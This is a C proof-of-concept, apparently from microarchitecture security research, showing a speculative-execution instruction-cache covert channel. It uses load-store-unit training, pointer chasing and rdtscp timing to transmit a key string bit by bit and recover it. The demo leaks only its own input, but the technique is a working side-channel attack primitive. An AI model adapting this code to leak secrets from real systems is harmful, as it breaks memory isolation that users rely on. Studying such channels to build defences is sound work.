#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdbool.h>
#include <x86intrin.h>

#define THRESHHOLD 200
#define TRAIN_NUM 10

#define NOP "nop;"
#define NOP1 NOP
#define NOP2 NOP1 NOP1
#define NOP4 NOP2 NOP2
#define NOP8 NOP4 NOP4
#define NOP16 NOP8 NOP8
#define NOP32 NOP16 NOP16
#define NOP64 NOP32 NOP32
#define NOP128 NOP64 NOP64
#define NOP256 NOP128 NOP128
#define NOP512 NOP256 NOP256
#define NOP1024 NOP512 NOP512
#define NOP2048 NOP1024 NOP1024

/* default: 64B line size, L1-D 64KB assoc 2, L1-I 32KB assoc 2, L2 2MB assoc 8 */
#define LLC_SIZE (2 << 20)
uint8_t dummy[LLC_SIZE];

uint8_t array[200];

int str_num;
uint8_t key[200];
char key_str[20];
uint8_t guess[200] = {0};
char guess_str[20];

int func1() {
    int tmp[4] = {1, 2, 3, 4};
    tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	return 0;
}

int func_padding1() {
	asm(NOP1024);
	return 0; 
}

int func2() {
	int tmp[4] = {1, 2, 3, 4};
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	return 0;
}


int func_padding2() {
	asm(NOP1024);
	return 0; 
}

int func3() {
	int tmp[4] = {1, 2, 3, 4};
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	tmp[0] += tmp[0];
	tmp[1] -= tmp[1];
	tmp[2] *= tmp[2];
	tmp[3] /= tmp[3];
	return 0;
}

int (*func_arr[3])() = {func1, func2, func3};

uint8_t **ptr2;
uint8_t ***ptr3;
uint8_t ****ptr4;
uint8_t *****ptr5;

#define POINTER_CHASING(val) \
	{                        \
		ptr2 = &(val);       \
		ptr3 = &ptr2;        \
		ptr4 = &ptr3;        \
		ptr5 = &ptr4;        \
	}

void encode(uint8_t *****ptr5_data, bool is_attack, uint8_t *secret) {
	if (is_attack)
		memset(dummy, 1, sizeof(dummy));

	*****ptr5_data = 2;
    uint8_t data = *secret;
	int (*func_ptr)() = func_arr[data];
	func_ptr();
	func_ptr();
	func_ptr();
	func_ptr();
	func_ptr();
}

void train_lsu(int num, uint8_t *secret) {
    uint8_t *tmp1 = (uint8_t*)malloc(num);
	//uint8_t *tmp2 = (uint8_t *)malloc(num);
	for (int i = 0; i < num; i++) {
		POINTER_CHASING(tmp1);
		encode(ptr5, false, secret);
	}
}

int decode(unsigned long *etime) {
	unsigned int junk;
	unsigned long time1, time2;

	asm(NOP128);
	
	_mm_mfence();
	time1 = __rdtscp(&junk);
	_mm_lfence();
	func1();
	time2 = __rdtscp(&junk);
	_mm_lfence();
	etime[0] = time2 - time1;

	asm(NOP128);

	_mm_mfence();
	time1 = __rdtscp(&junk);
	_mm_lfence();
	func2();
	time2 = __rdtscp(&junk);
	_mm_lfence();
	etime[1] = time2 - time1;

	if (etime[0] > etime[1] && etime[0] - etime[1] > THRESHHOLD)
		return 1;
	return 0;
}

void str_to_bitstream() {
    int i, j;
    uint8_t c_val = 0;
    for (i = 0; i < str_num; i++) {
        c_val = (uint8_t)key_str[i];
        for (j = 7; j >= 0; j--) {
            key[8 * i + j] = c_val & 1;
            c_val >>= 1;
        }
    }
}

void bitstream_to_str() {
    int i, j;
    uint8_t tmp;
    for (i = 0; i < str_num; i++) {
        tmp = 0;
        for (j = 0; j < 8; j++) {
            if (guess[i * 8 + j])
                tmp += 1 << (7 - j);
        }
        guess_str[i] = (char)tmp;
    }
    guess_str[i] = '\0';
}

int count_result(int results[], int begin, int end) {
    int count[2] = {0}, i = begin;
    for (; i < end; i++) {
        if (results[i])
            count[1]++;
		else
			count[0]++;
	}
    return count[0] > count[1] ? 0 : 1;
}

int main(int argc, char **argv) {
	if (argc < 3) {
        perror("ERROR: You must input two arguments as [sample_number] [key string]!\n");
        exit(-1);
    }

    int sample_num, i, j;
    sample_num = atoi(argv[1]);

    str_num = strlen(argv[2]);
    if (str_num >= 20) {
        perror("ERROR: The length of sending key string must be smaller than 20!\n");
        exit(-1);
    }

	strncpy(key_str, argv[2], str_num);
	printf("======> 1. Save the sending key string: %s\n", key_str);

	str_to_bitstream();
	printf("======> 2. Translate the sending key string to bitstream: \n");
	for (i = 0; i < str_num * 8; i++) {
		printf("%d", key[i]);
		if ((i + 1) % 8 == 0)
			printf(" ");
	}
    printf("\n");

	memcpy(array, key, str_num*8);

	printf("======> 3. Transmit the bitstream via icache channel: \n");
	int *sample_results = malloc(sizeof(int) * sample_num);
	unsigned long tmp[2];
	for (i = 0; i < str_num * 8; i++) {
		printf("bit-%d: %d -> ", i, key[i]);
        for (j = 0; j < sample_num; j++) {
			train_lsu(TRAIN_NUM, &(array[i]));
			uint8_t *ptr = &(array[i]);
			POINTER_CHASING(ptr);
			encode(ptr5, true, &(key[i]));
			sample_results[j] = decode(tmp);
			//printf("(%lu, %lu) ", tmp[0], tmp[1]);
			printf("%lu ", tmp[0]);
			asm(NOP2048);
			array[i] = key[i];
			asm(NOP2048);
		}
		guess[i] = count_result(sample_results, 0, sample_num-1);
		printf(" = %d\n", guess[i]);
	}

	bitstream_to_str();
	printf("======> 4. Transform the receiving bitstream to key string: %s \n", guess_str);

	return 0;
}
